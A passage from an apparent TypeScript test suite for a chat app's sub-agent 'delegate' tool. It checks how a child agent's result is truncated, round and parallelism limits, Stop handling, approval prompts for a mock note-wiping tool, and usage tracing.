      message: { role: 'assistant', content: '', tool_calls: calls.map(([name, args]) => ({ function: { name, arguments: args } })) },
      done: false
    }) + line({ done: true })
  /** The last event a card showed. */
  const lastEvent = (conversationId: string, index: number) =>
    toolEventsIn(conversationId)
      .filter((e) => e.index === index)
      .at(-1)?.event
  /** The card has shown its call's result. */
  const finished = (conversationId: string, index: number) => {
    const e = lastEvent(conversationId, index)
    return !!e && !e.pending
  }
  const withAtOnce = async (parallel: number, run: () => Promise<void>) => {
    updateSettings({ delegate: { parallel } })
    try {
      await run()
    } finally {
      updateSettings({ delegate: { parallel: 3 } })
    }
  }
  /** The reply a delegate call belongs to, as generate() describes it. */
  const parentReply = (conversationId: string, messageId: string): ToolContext['reply'] => ({
    conversationId,
    messageId,
    model: 'ollama/llama3.2',
    think: null,
    prompt: { userName: '', model: 'llama3.2', contextLength: 8192, web: 'on', skillIndex: [] }
  })
  /** A tool that acts on this Mac: it asks first, and can be allowed for the chat. */
  const registerWipe = () => {
    const runs: string[] = []
    const off = registerToolProvider({
      id: 'wipe-test',
      tools: () => [{ type: 'function', function: { name: 'notes__wipe', description: 'Wipe a note', parameters: { type: 'object' } } }],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: 'wiping' }),
      run: async ({ name, args }) => {
        runs.push(name)
        return { content: 'Wiped.', event: { tool: name, args, ok: true, summary: 'wiped' } }
      },
      approval: () => 'ask'
    })
    return { runs, off }
  }

  beforeEach(() => setApiKey('test-key')) // web tools on, so delegate is offered

  it('runs a child on the task and gives the parent only its result', async () => {
    chat = (b, res, n) => {
      if (isChild(b))
        return hasToolResult(b)
          ? reply('The headline is OLLMOST-CHILD-OK.')(b, res, n)
          : void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost' }))
      return hasToolResult(b)
        ? reply('The sub-agent found: OLLMOST-CHILD-OK.')(b, res, n)
        : void res.writeHead(200).end(delegateCall('Search for ollmost and report the headline.'))
    }
    web = (_p, res) =>
      res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmost', url: 'https://k.io', content: 'OLLMOST-CHILD-OK' }] }))
    const r = start('find the headline')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('The sub-agent found: OLLMOST-CHILD-OK.')
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'delegate', ok: true, summary: 'Search for ollmost and report the headline. · 1 tool call' })
    expect(event.pending).toBeUndefined()
    expect(event.child).toMatchObject({
      task: 'Search for ollmost and report the headline.',
      result: 'The headline is OLLMOST-CHILD-OK.',
      rounds: 2
    })
    expect(event.child!.events).toEqual([expect.objectContaining({ tool: 'web_search', ok: true })])
    // The parent's request after the call carries the child's reply, not its reading.
    const parentAfter = chatCalls.find((b) => !isChild(b) && hasToolResult(b))!
    const toolMsg = (parentAfter.messages as Array<{ role: string; content: string }>).find((m) => m.role === 'tool')!
    expect(toolMsg.content).toBe('The headline is OLLMOST-CHILD-OK.')
    expect(toolMsg.content).not.toContain('k.io')
    // The child was offered no delegate of its own; the parent was.
    const childReq = chatCalls.find(isChild)!
    expect(offeredIn(childReq)).not.toContain('delegate')
    expect(offeredIn(chatCalls[0])).toContain('delegate')
    expect(String((chatCalls[0].messages as Array<{ content: string }>)[0].content)).toContain('<sub_agents>')
    // Billed on the chat as delegate rows; traced as the child's own turn.
    const rows = all<{ kind: string; message_id: string }>(
      'SELECT kind, message_id FROM usage_events WHERE conversation_id = ? AND kind = ?',
      r.conversation.id,
      'delegate'
    )
    expect(rows).toEqual([
      { kind: 'delegate', message_id: r.assistantMessageId },
      { kind: 'delegate', message_id: r.assistantMessageId }
    ])
    const traces = listTraces(r.conversation.id)
    expect(traces.filter((t) => t.kind === 'delegate').every((t) => t.messageId === `${r.assistantMessageId}#0`)).toBe(true)
    expect(traces.filter((t) => t.kind === 'delegate')).toHaveLength(2)
    // The chat's title request starts after done, so wait for it; a trace stuck running still fails here.
    await waitFor(() => listTraces(r.conversation.id).every((t) => t.status !== 'running'))
    // Live: the parent's event was re-emitted with the child's search while it ran.
    const live = toolEventsIn(r.conversation.id).find((e) => e.event.pending && e.event.child?.events.some((c) => c.tool === 'web_search'))
    // Its search came from the child's first request.
    expect(live?.event.child?.rounds).toBe(1)
  })

  it('moves the chat’s usage chip on a child’s own request, not only when the parent’s round ends', async () => {
    chat = (b, res, n) => {
      if (isChild(b))
        return hasToolResult(b)
          ? reply('The headline is OLLMOST-CHILD-OK.')(b, res, n)
          : void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost' }))
      return hasToolResult(b)
        ? reply('The sub-agent found: OLLMOST-CHILD-OK.')(b, res, n)
        : void res.writeHead(200).end(delegateCall('Search for ollmost and report the headline.'))
    }
    web = (_p, res) =>
      res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmost', url: 'https://k.io', content: 'OLLMOST-CHILD-OK' }] }))
    const r = start('find the headline')
    const done = await doneEvent(r.conversation.id)
    const doneIndex = events.indexOf(done)
    // Before the reply is done (a title request afterwards ticks the chip too, but that's not what's under test).
    const usage = events
      .slice(0, doneIndex)
      .filter((e): e is Extract<ChatEvent, { type: 'usage' }> => e.type === 'usage' && e.conversationId === r.conversation.id)
    // One tick for the parent's own round (the delegate call itself), and a second for the child's first
    // request — not just the one tick the parent's round alone would give.
    expect(usage.length).toBeGreaterThanOrEqual(2)
    const rows = all<{ kind: string }>(
      'SELECT kind FROM usage_events WHERE conversation_id = ? AND kind = ?',
      r.conversation.id,
      'delegate'
    )
    expect(rows.length).toBeGreaterThan(0)
    // The second tick already counts the child's row: its running total is past the first tick's.
    expect(usage[1].usage.promptTokens + usage[1].usage.completionTokens).toBeGreaterThan(
      usage[0].usage.promptTokens + usage[0].usage.completionTokens
    )
  })

  it('is offered beside another tool, and never to a child or outside a reply', async () => {
    const { delegateTools } = await import('../src/main/chat/delegate')
    const offered = (over: Partial<ToolContext>) =>
      delegateTools
        .tools({ mode: 'chat', skills: false, web: false, sources: [], workspace: null, reply: parentReply('c', 'm'), ...over })
        .map((t) => t.function.name)
    expect(offered({ web: true })).toEqual(['delegate'])
    // Skills alone give a sub-agent nothing to do.
    expect(offered({ skills: true })).toEqual([])
    // The code runner, when run_code is offered: switched on with a workspace of Ollmost's own readied.
    expect(offered({ sources: ['code'], workspace: { owned: true } as Workspace })).toEqual(['delegate'])
    expect(offered({ sources: ['code'] })).toEqual([])
    // An MCP server switched on counts by the tools it offers.
    expect(offered({ sources: ['mcp:not-running'] })).toEqual([])
    const off = registerToolProvider({
      id: 'notes',
      tools: () => [{ type: 'function', function: { name: 'notes__search', description: 'Search notes', parameters: { type: 'object' } } }],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: '' }),
      run: async ({ name, args }) => ({ content: '', event: { tool: name, args, ok: true, summary: '' } })
    })
    try {
      expect(offered({})).toEqual(['delegate'])
    } finally {
      off()
    }
    expect(offered({ web: true, child: true })).toEqual([])
    expect(offered({ web: true, reply: undefined })).toEqual([])
  })

  it('is not offered without tools to delegate to, nor when switched off', async () => {
    setApiKey('')
    chat = reply('plain')
    const r = start('hi')
    await doneEvent(r.conversation.id)
    expect(offeredIn(chatCalls[0])).not.toContain('delegate')
    expect(String((chatCalls[0].messages as Array<{ content: string }>)[0].content)).not.toContain('<sub_agents>')
    setApiKey('test-key')
    updateSettings({ delegate: { enabled: false, maxRounds: 20 } })
    try {
      chat = reply('plain')
      const r2 = start('hi again')
      await doneEvent(r2.conversation.id)
      expect(offeredIn(chatCalls.at(-1)!)).toContain('web_search')
      expect(offeredIn(chatCalls.at(-1)!)).not.toContain('delegate')
    } finally {
      updateSettings({ delegate: { enabled: true, maxRounds: 20 } })
    }
  })

  it('a child that runs out of rounds returns what it had, with a note', async () => {
    updateSettings({ delegate: { enabled: true, maxRounds: 2 } })
    try {
      chat = (b, res, n) => {
        if (isChild(b))
          return b.tools
            ? void res
                .writeHead(200)
                .end(line({ message: { role: 'assistant', content: 'Partial. ' }, done: false }) + toolCall('web_search', { query: 'x' }))
            : reply('Still partial.')(b, res, n)
        return hasToolResult(b) ? reply('ok')(b, res, n) : void res.writeHead(200).end(delegateCall('Loop forever.'))
      }
      web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
      const r = start('loop')
      const done = await doneEvent(r.conversation.id)
      expect(done.message.toolEvents[0].child?.result).toContain('stopped at its limit of 2 requests')
      expect(done.message.toolEvents[0].child?.result).toContain('Still partial.')
      expect(done.message.toolEvents[0].child?.rounds).toBe(2)
    } finally {
      updateSettings({ delegate: { enabled: true, maxRounds: 20 } })
    }
  })

  it('a sub-agent gets its own Requests-per-task limit, even above the chat reply’s own', async () => {
    // The chat's own reply may make only 2 requests; the sub-agent's task budget is much higher.
    updateSettings({ chat: { maxRounds: 2 }, delegate: { enabled: true, maxRounds: 10 } })
    try {
      chat = (b, res, n) => {
        if (isChild(b))
          return b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: 'x' })) : reply('Still going.')(b, res, n)
        return hasToolResult(b) ? reply('ok')(b, res, n) : void res.writeHead(200).end(delegateCall('Keep going.'))
      }
      web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
      const r = start('go')
      const done = await doneEvent(r.conversation.id)
      // The child ran to the delegate limit, well past what the chat's own reply may make.
      expect(done.message.toolEvents[0].child?.rounds).toBe(10)
      expect(done.message.content).toBe('ok')
      expect(done.message.stats?.toolRoundLimit).toBe(2) // the parent's own limit, from Settings → Chats
      expect(chatCalls.filter(isChild)).toHaveLength(10)
      expect(done.message.toolEvents[0].child?.result).toContain('stopped at its limit of 10 requests')
    } finally {
      updateSettings({ chat: { maxRounds: 20 }, delegate: { enabled: true, maxRounds: 20 } })
    }
  })

  it('an approval inside the child is keyed by the child’s id and stored on the chat', async () => {
    const { childId } = await import('../src/shared/toolEvents')
    const { runs, off } = registerWipe()
    try {
      chat = (b, res, n) => {
        if (isChild(b)) return hasToolResult(b) ? reply('Wiped it.')(b, res, n) : void res.writeHead(200).end(toolCall('notes__wipe', {}))
        // Then the parent calls the same tool itself: allowed for the chat inside the child, it runs unasked.
        const results = toolResults(b)
        if (results === 0) return void res.writeHead(200).end(delegateCall('Wipe the note.'))
        if (results === 1) return void res.writeHead(200).end(toolCall('notes__wipe', {}))
        return reply('done')(b, res, n)
      }
      const r = start('wipe it')
      const waiting = await waitFor(() => toolEventsIn(r.conversation.id).find((e) => !!e.event.child?.events.some((c) => c.awaiting)))
      // The parent's card carries the question up, and is saved at once, as the parent's own questions are.
      expect(waiting).toMatchObject({ index: 0, event: { tool: 'delegate', awaiting: true, pending: true } })
      expect(getMessage(r.assistantMessageId)!.toolEvents[0].child?.events[0]).toMatchObject({ tool: 'notes__wipe', awaiting: true })
      expect(runs).toEqual([])
      // The renderer answers with the child's id and the child's index; the parent's own id is not waiting.
      expect(() => approvals.decide(r.conversation.id, r.assistantMessageId, 0, 'chat')).toThrow(/isn't waiting/)
      approvals.decide(r.conversation.id, childId(r.assistantMessageId, 0), 0, 'chat')
      const done = await doneEvent(r.conversation.id)
      expect(done.message.toolEvents[0].child?.events[0]).toMatchObject({ tool: 'notes__wipe', ok: true })
      expect(done.message.toolEvents[0].awaiting).toBeUndefined()
      expect(done.conversation.allowedTools).toEqual(['notes__wipe'])
      expect(done.message.toolEvents[1]).toMatchObject({ tool: 'notes__wipe', ok: true })
      expect(runs).toEqual(['notes__wipe', 'notes__wipe'])
      expect(toolEventsIn(r.conversation.id).some((e) => e.index === 1 && e.event.awaiting)).toBe(false)
    } finally {
      off()
    }
  })

  it('Stop during the child settles both', async () => {
    chat = (b, res) => {
      if (isChild(b)) return streamChunks(res, [line({ message: { role: 'assistant', content: 'thinking' }, done: false })]) // hangs
      return void res.writeHead(200).end(delegateCall('Take forever.'))
    }
    const r = start('stop me')
    await waitFor(() => chatCalls.some(isChild))
    await service.stop(r.conversation.id)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.stats).toBeTruthy()
    expect(saved.error).toBeNull()
    expect(saved.toolEvents[0]).toMatchObject({ tool: 'delegate', pending: false, ok: false })
    expect(saved.toolEvents[0].summary).toContain('stopped')
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
    expect(listTraces(r.conversation.id).find((t) => t.kind === 'delegate')?.status).toBe('aborted')
  })

  it('Stop while a child’s call waits for approval settles the call and the parent’s question', async () => {
    const { off } = registerWipe()
    try {
      chat = (b, res) => void res.writeHead(200).end(isChild(b) ? toolCall('notes__wipe', {}) : delegateCall('Wipe the note.'))
      const r = start('wipe it')
      await waitFor(() => toolEventsIn(r.conversation.id).find((e) => e.event.awaiting))
      await service.stop(r.conversation.id)
      const [event] = getMessage(r.assistantMessageId)!.toolEvents
      expect(event).toMatchObject({ tool: 'delegate', pending: false, ok: false, summary: 'Wipe the note. (stopped)' })
      expect(event.awaiting).toBeUndefined()
      // The call that waited never ran.
      expect(event.child!.events).toEqual([
        { tool: 'notes__wipe', args: {}, ok: false, pending: false, summary: 'wiping (not run)', at: 0 }
      ])
      expect(approvals.waitingCount()).toBe(0)
      expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
    } finally {
      off()
    }
  })

  it('settles a child’s waiting call in a reply Ollmost closed on', () => {
    const c = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
    const user = insertMessage({ conversationId: c.id, parentId: null, role: 'user', content: 'wipe it' })
    const cut = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: '' })
    // A checkpoint saved the child's question, then the app died.
    const waiting = { tool: 'notes__wipe', args: {}, ok: true, pending: true, awaiting: true, summary: 'wiping' }
    const child = { task: 'Wipe the note.', events: [waiting], result: '', rounds: 1 }
    updateMessage(cut.id, {
      toolEvents: [
        { tool: 'delegate', args: { task: 'Wipe the note.' }, ok: true, pending: true, awaiting: true, summary: 'Wipe the note.', child }
      ]
    })
    service.markInterruptedReplies()
    const [event] = getMessage(cut.id)!.toolEvents
    // The sub-agent ran, so it stopped; only the call it was waiting on never ran.
    expect(event).toMatchObject({ tool: 'delegate', pending: false, ok: false, summary: 'Wipe the note. (stopped)' })
    expect(event.awaiting).toBeUndefined()
    expect(event.child!.events).toEqual([{ tool: 'notes__wipe', args: {}, ok: false, pending: false, summary: 'wiping (not run)' }])
  })

  it('refuses to run a child that nothing could stop', async () => {
    const { delegateTools } = await import('../src/main/chat/delegate')
    const c = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
    const m = insertMessage({ conversationId: c.id, parentId: null, role: 'assistant', content: '', model: 'ollama/llama3.2' })
    chat = reply('A child answered.')
    const result = await delegateTools.run(
      { provider: delegateTools, name: 'delegate', via: null, args: { task: 'Look it up.' } },
      {
        mode: 'chat',
        skills: false,
        web: true,
        sources: [],
        workspace: null,
        reply: parentReply(c.id, m.id),
        callIndex: 0,
        grants: new Set()
      }
    )
    expect(result.event).toMatchObject({ tool: 'delegate', ok: false })
    expect(chatCalls).toHaveLength(0)
  })

  it('cuts a child’s long reply at the reply length set, with a mark, before the parent gets it', async () => {
    const long = 'word '.repeat(3_000).trim()
    updateSettings({ delegate: { resultChars: 12_000 } })
    try {
      chat = (b, res, n) =>
        isChild(b)
          ? reply(long)(b, res, n)
          : hasToolResult(b)
            ? reply('ok')(b, res, n)
            : void res.writeHead(200).end(delegateCall('Write at length.'))
      const r = start('long')
      const done = await doneEvent(r.conversation.id)
      const result = done.message.toolEvents[0].child!.result
      expect(result).toBe(`${long.slice(0, 12_000)}${CUT_MARK}`)
      expect(toolMessageIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toBe(result)
      // The child was told where it would be cut, and the parent what reaches it.
      expect(systemOf(chatCalls.find(isChild)!)).toContain('Your reply is cut after about 2,000 words')
      expect(systemOf(chatCalls.find((b) => !isChild(b))!)).toContain("A sub-agent's reply reaches you cut at about 2,000 words")
    } finally {
      updateSettings({ delegate: { resultChars: 24_000 } })
    }
  })

  it('gives the parent as much of a child’s reply as the setting allows when the call has room, past other tools’ limit', async () => {
    // A model name never fetched before, so its info isn't the 8192-token one other tests cached for llama3.2: its
    // window (Ollmost's 32K local cap) has room for the longest reply.
    const base = ollama.handler
    ollama.handler = (req, res) => {
      if (req.url === '/api/show' && req.json.model === 'wide-window')
        return res
          .writeHead(200)
          .end(JSON.stringify({ capabilities: ['completion', 'tools'], model_info: { 'llama.context_length': 131_072 } }))
      return base!(req, res)
    }
    try {
      for (const [resultChars, length, words] of [
        [24_000, 30_000, '4,000'],
        [48_000, 50_000, '8,000']
      ] as const) {
        updateSettings({ delegate: { resultChars } })
        chatCalls = []
        const long = 'word '.repeat(length / 5)
        chat = (b, res, n) =>
          isChild(b)
            ? reply(long)(b, res, n)
            : hasToolResult(b)
              ? reply('ok')(b, res, n)
              : void res.writeHead(200).end(delegateCall('Write at length.'))
        const r = service.send({ ...sendBody(''), conversationId: null, content: 'long', model: 'wide-window' })
        const done = await doneEvent(r.conversation.id)
        const result = done.message.toolEvents[0].child!.result
        expect(result).toBe(`${long.slice(0, resultChars)}${CUT_MARK}`)
        expect(toolMessageIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toBe(result)
        expect(systemOf(chatCalls.find(isChild)!)).toContain(`Your reply is cut after about ${words} words`)
        expect(systemOf(chatCalls.find((b) => !isChild(b))!)).toContain(`A sub-agent's reply reaches you cut at about ${words} words`)
      }
    } finally {
      ollama.handler = base
      updateSettings({ delegate: { resultChars: 24_000 } })
    }
  })

  it('cuts sub-agents run together to their shares of a small room, and tells each the limit it is cut at', async () => {
    const { wordsIn } = await import('../src/main/chat/prompts')
    const long = 'word '.repeat(6_000).trim()
    chat = (b, res, n) =>
      isChild(b)
        ? reply(long)(b, res, n)
        : hasToolResult(b)
          ? reply('ok')(b, res, n)
          : void res
              .writeHead(200)
              .end(
                callsTogether(
                  ['delegate', { task: 'Part one.' }],
                  ['delegate', { task: 'Part two.' }],
                  ['delegate', { task: 'Part three.' }]
                )
              )
    const r = start('three parts')
    const done = await doneEvent(r.conversation.id)
    const results = done.message.toolEvents.map((e) => e.child!.result)
    expect(results).toHaveLength(3)
    // Each got the same share of the room, well short of the setting, and was cut to it, mark and all.
    const share = results[0].length
    expect(share).toBeLessThan(24_000 / 3)
    for (const result of results) expect(result).toBe(`${long.slice(0, share - CUT_MARK.length)}${CUT_MARK}`)
    // Together they fit the parent's room: an 8192-token window leaves 6144 for the request, at 4 characters a
    // token, and no more than 90% of it for results.
    expect(share * 3).toBeLessThanOrEqual(6_144 * 4 * 0.9)
    expect(toolMessagesIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toEqual(results)
    // Each child was told the limit its reply was cut at.
    const children = chatCalls.filter(isChild)
    expect(children).toHaveLength(3)
    const words = wordsIn(share - CUT_MARK.length).toLocaleString('en-US')
    for (const b of children) expect(systemOf(b)).toContain(`Your reply is cut after about ${words} words,`)
  })

  it('cuts a child’s reply to the room its call has, so the card shows what the parent got', async () => {
    const { runTool } = await import('../src/main/chat/tools')
    const c = createConversation({ projectId: null, model: 'ollama/llama3.2', think: null, skills: [], toolSources: [] })
    const m = insertMessage({ conversationId: c.id, parentId: null, role: 'assistant', content: '', model: 'ollama/llama3.2' })
    chat = reply('word '.repeat(3_000).trim())
    const result = await runTool(
      { function: { name: 'delegate', arguments: { task: 'Write at length.' } } },
      {
        mode: 'chat',
        skills: false,
        web: true,
        sources: [],
        workspace: null,
        reply: parentReply(c.id, m.id),
        callIndex: 0,
        signal: new AbortController().signal,
        maxResultChars: 2_000
      }
    )
    expect(result.content.length).toBeLessThanOrEqual(2_000)
    expect(result.content).toMatch(/\[… the sub-agent’s reply was cut here\]$/)
    expect(result.event.child!.result).toBe(result.content)
  })

  it('a child whose request fails gives the parent a failure, with its calls settled', async () => {
    chat = (b, res, n) => {
      if (isChild(b))
        return void (hasToolResult(b) ? res.writeHead(500).end('boom') : res.writeHead(200).end(toolCall('web_search', { query: 'x' })))
      return hasToolResult(b) ? reply('It failed.')(b, res, n) : void res.writeHead(200).end(delegateCall('Search, then fail.'))
    }
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
    const r = start('fail')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.error).toBeNull()
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'delegate', ok: false, summary: 'Search, then fail. · failed' })
    expect(event.child!.events).toEqual([expect.objectContaining({ tool: 'web_search', ok: true })])
    expect(event.child!.events.some((e) => e.pending || e.awaiting)).toBe(false)
    // The reason is kept on the child, for its card, and is what the parent was told.
    expect(event.child!.error).toBeTruthy()
    expect(toolMessageIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toBe(`The sub-agent failed: ${event.child!.error}`)
    // The chat's title request starts after done, so wait for it; a trace stuck running still fails here.
    await waitFor(() => listTraces(r.conversation.id).every((t) => t.status !== 'running'))
  })

  it('a child’s prompt doesn’t name the user, who isn’t reading it', async () => {
    updateSettings({ userName: 'Ada' })
    try {
      chat = (b, res, n) =>
        isChild(b)
          ? reply('Done.')(b, res, n)
          : hasToolResult(b)
            ? reply('ok')(b, res, n)
            : void res.writeHead(200).end(delegateCall('Look.'))
      const r = start('look')
      await doneEvent(r.conversation.id)
      expect(systemOf(chatCalls[0])).toContain('You are talking with Ada.')
      expect(systemOf(chatCalls.find(isChild)!)).not.toContain('Ada')
      expect(systemOf(chatCalls.find(isChild)!)).not.toContain('talking with')
    } finally {
      updateSettings({ userName: '' })
    }
  })

  it('two delegations in one round run in order', async () => {
    // One at a time, as Settings allows.
    await withAtOnce(1, async () => {
      const order: string[] = []
      chat = (b, res, n) => {
        if (isChild(b)) {
          const task = String((b.messages as Array<{ content: string }>).at(-1)!.content)
          order.push(task.includes('first') ? 'first' : 'second')
          return reply(task.includes('first') ? 'A' : 'B')(b, res, n)
        }
        return hasToolResult(b)
          ? reply('A then B')(b, res, n)
          : void res.writeHead(200).end(
              line({
                message: {
                  role: 'assistant',
                  content: '',
                  tool_calls: [
                    { function: { name: 'delegate', arguments: { task: 'the first' } } },
                    { function: { name: 'delegate', arguments: { task: 'the second' } } }
                  ]
                },
                done: false
              }) + line({ done: true })
            )
      }
      const r = start('two')
      const done = await doneEvent(r.conversation.id)
      expect(order).toEqual(['first', 'second'])
      expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['A', 'B'])
      const traces = listTraces(r.conversation.id).filter((t) => t.kind === 'delegate')
      expect(traces.map((t) => t.messageId)).toEqual([`${r.assistantMessageId}#0`, `${r.assistantMessageId}#1`])
    })
  })

  it('two delegations in one round run at the same time', async () => {
    let release!: () => void
    const held = new Promise<void>((resolve) => (release = resolve))
    chat = (b, res, n) => {
      // The first child's answer waits until the second has finished: one after the other, the second never starts.
      if (isChild(b)) return taskOf(b).includes('first') ? held.then(() => reply('A')(b, res, n)) : reply('B')(b, res, n)
      return hasToolResult(b)
        ? reply('A and B')(b, res, n)
        : void res.writeHead(200).end(callsTogether(['delegate', { task: 'the first' }], ['delegate', { task: 'the second' }]))
    }
    const r = start('two at once')
    const together = await waitFor(() => chatCalls.filter(isChild).length === 2 && finished(r.conversation.id, 1), 1000)
      .then(() => true)
      .catch(() => false)
    release()
    const done = await doneEvent(r.conversation.id)
    expect(together, 'the second sub-agent started and finished while the first waited').toBe(true)
    // Each result keeps its call's place, though the second finished first.
    expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['A', 'B'])
    expect(toolMessagesIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toEqual(['A', 'B'])
    const traces = listTraces(r.conversation.id).filter((t) => t.kind === 'delegate')
    expect(traces.map((t) => t.messageId).sort()).toEqual([`${r.assistantMessageId}#0`, `${r.assistantMessageId}#1`])
    await waitFor(() => listTraces(r.conversation.id).every((t) => t.status !== 'running'))
  })

  it('runs no more sub-agents at once than Settings allows, and every one of them', async () => {
    await withAtOnce(2, async () => {
      let running = 0
      let most = 0
      chat = (b, res, n) => {
        if (isChild(b)) {
          most = Math.max(most, ++running)
          // Each answers after a moment, so the ones running together overlap.
          const answer = taskOf(b).match(/the (\w+)/)![1]
          return new Promise((r) => setTimeout(r, 100)).then(() => reply(answer)(b, res, n)).finally(() => running--)
        }
        return hasToolResult(b)
          ? reply('all three')(b, res, n)
          : void res
              .writeHead(200)
              .end(
                callsTogether(
                  ['delegate', { task: 'the first' }],
                  ['delegate', { task: 'the second' }],
                  ['delegate', { task: 'the third' }]
                )
              )
      }
      const r = start('three')
      const done = await doneEvent(r.conversation.id)
      expect(most).toBe(2)
      expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['first', 'second', 'third'])
      expect(toolMessagesIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toEqual(['first', 'second', 'third'])
    })
  })

  it('reads the setting where it is used: 99 runs up to 5 at once, and 0 one after another', async () => {
    const two = callsTogether(['delegate', { task: 'the first' }], ['delegate', { task: 'the second' }])
    let running = 0
    let most = 0
    const handler: ChatHandler = (b, res, n) => {
      if (!isChild(b)) return hasToolResult(b) ? reply('done')(b, res, n) : void res.writeHead(200).end(two)
      most = Math.max(most, ++running)
      // Each answers after a moment, so children running together overlap.
      const answer = taskOf(b).includes('first') ? 'A' : 'B'
      return new Promise((r) => setTimeout(r, 50)).then(() => reply(answer)(b, res, n)).finally(() => running--)
    }
    await withAtOnce(99, async () => {
      chat = handler
      const r = start('many')
      const done = await doneEvent(r.conversation.id)
      expect(systemOf(chatCalls[0])).toContain('up to 5 at once')
      expect(most).toBe(2)
      expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['A', 'B'])
    })
    chatCalls = []
    most = 0
    await withAtOnce(0, async () => {
      chat = handler
      const r = start('none')
      const done = await doneEvent(r.conversation.id)
      expect(systemOf(chatCalls[0])).toContain('runs one task at a time')
      expect(systemOf(chatCalls[0])).not.toContain('at the same time')
      expect(most).toBe(1)
      expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['A', 'B'])
    })
  })

  it('Stop while two sub-agents run together stops both, promptly, with their calls settled', async () => {
    chat = (b, res) =>
      void res
        .writeHead(200)
        .end(
          isChild(b)
            ? toolCall('web_search', { query: taskOf(b).includes('first') ? 'first' : 'second' })
            : callsTogether(['delegate', { task: 'the first' }], ['delegate', { task: 'the second' }])
        )
    web = () => undefined // no search ever answers
    const r = start('stop us')
    // Both children are waiting on their searches.
    const searching = (index: number) => !!lastEvent(r.conversation.id, index)?.child?.events.some((e) => e?.tool === 'web_search')
    await waitFor(() => searching(0) && searching(1), 2000)
    const t0 = Date.now()
    await service.stop(r.conversation.id)
    expect(Date.now() - t0).toBeLessThan(1000)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.error).toBeNull()
    expect(saved.toolEvents).toHaveLength(2)
    for (const [index, event] of saved.toolEvents.entries()) {
      expect(event).toMatchObject({ tool: 'delegate', pending: false, ok: false, summary: `the ${['first', 'second'][index]} (stopped)` })
      expect(event.child!.events).toEqual([expect.objectContaining({ tool: 'web_search', pending: false, ok: false })])
      expect(event.child!.events[0].summary).toMatch(/\(stopped\)$/)
    }
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
    // Each delegate call, and the search inside each child, was traced as stopped.
    const stopped = listTraces(r.conversation.id).filter((t) => t.kind === 'tool' && t.status === 'aborted')
    const id = r.assistantMessageId
    expect(stopped.map((t) => t.messageId).sort()).toEqual([id, id, `${id}#0`, `${id}#1`].sort())
  })

  it('Stop leaves a sub-agent the limit kept waiting unstarted, and saves it as not run', async () => {
    await withAtOnce(2, async () => {
      chat = (b, res) =>
        isChild(b)
          ? streamChunks(res, [line({ message: { role: 'assistant', content: 'working' }, done: false })]) // hangs
          : void res
              .writeHead(200)
              .end(
                callsTogether(
                  ['delegate', { task: 'the first' }],
                  ['delegate', { task: 'the second' }],
                  ['delegate', { task: 'the third' }]
                )
              )
      const r = start('three, then stop')
      const id = r.assistantMessageId
      await waitFor(() => chatCalls.filter(isChild).length === 2, 2000)
      // The third shows, waiting its turn.
      expect(lastEvent(r.conversation.id, 2)).toMatchObject({ tool: 'delegate', pending: true })
      await service.stop(r.conversation.id)
      const saved = getMessage(id)!
      expect(saved.toolEvents.map((e) => e.summary)).toEqual(['the first (stopped)', 'the second (stopped)', 'the third (not run)'])
      expect(saved.toolEvents.some((e) => e.pending || e.ok || e.awaiting)).toBe(false)
      // It never ran: no request of its own, and no trace, of its call or of a child.
      expect(chatCalls.filter(isChild).some((b) => taskOf(b).includes('third'))).toBe(false)
      const traces = listTraces(r.conversation.id)
      expect(traces.filter((t) => t.kind === 'tool' && t.messageId === id)).toHaveLength(2)
      expect(traces.some((t) => t.messageId === `${id}#2`)).toBe(false)
      expect(traces.every((t) => t.status !== 'running')).toBe(true)
    })
  })

  it('a sub-agent that fails beside one that answers: both come back as results, in call order', async () => {
    chat = (b, res, n) => {
      if (isChild(b)) {
        // The second fails at once and the first answers a moment later, so they finish out of order.
        if (taskOf(b).includes('second')) return void res.writeHead(500).end('boom')
        return new Promise((r) => setTimeout(r, 100)).then(() => reply('A')(b, res, n))
      }
      return hasToolResult(b)
        ? reply('One answered, one failed.')(b, res, n)
        : void res.writeHead(200).end(callsTogether(['delegate', { task: 'the first' }], ['delegate', { task: 'the second' }]))
    }
    const r = start('one fails')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.error).toBeNull()
    expect(done.message.content).toBe('One answered, one failed.')
    expect(done.message.toolEvents.map((e) => [e.ok, e.summary])).toEqual([
      [true, 'the first · 0 tool calls'],
      [false, 'the second · failed']
    ])
    const [first, second, ...rest] = toolMessagesIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)
